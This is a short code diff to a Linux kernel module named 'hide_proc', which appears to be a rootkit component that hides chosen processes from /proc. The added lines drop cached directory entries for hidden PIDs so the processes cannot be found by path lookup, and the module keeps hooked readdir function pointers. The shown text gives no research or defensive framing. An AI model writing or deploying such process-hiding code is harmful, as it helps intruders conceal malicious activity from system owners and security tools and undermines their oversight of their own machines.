@@ -7,6 +7,7 @@
 #include <linux/list.h>
 #include <linux/spinlock.h>
 #include <linux/namei.h> // For filp_open/filp_close
+#include <linux/path.h> // For kern_path and d_drop
 
 // --- Original function pointers storage ---
 static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
@@ -44,6 +45,8 @@ bool is_pid_hidden(pid_t pid) {
 
 void add_hidden_pid(pid_t pid) {
     struct hidden_pid_entry *new_entry;
+    char path_str[32];
+    struct path path;
 
     if (is_pid_hidden(pid))
         return;
@@ -59,6 +62,14 @@ void add_hidden_pid(pid_t pid) {
     spin_unlock(&hidden_lock);
 
     printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
+
+    // Invalidate dcache entry to force re-lookup
+    snprintf(path_str, sizeof(path_str), "/proc/%d", (int)pid);
+    if (kern_path(path_str, LOOKUP_FOLLOW, &path) == 0) {
+        printk(KERN_INFO "[hide_proc] Found dentry for %s, invalidating.\n", path_str);
+        d_drop(path.dentry);
+        path_put(&path);
+    }
 }
 
 void remove_hidden_pid(pid_t pid) {
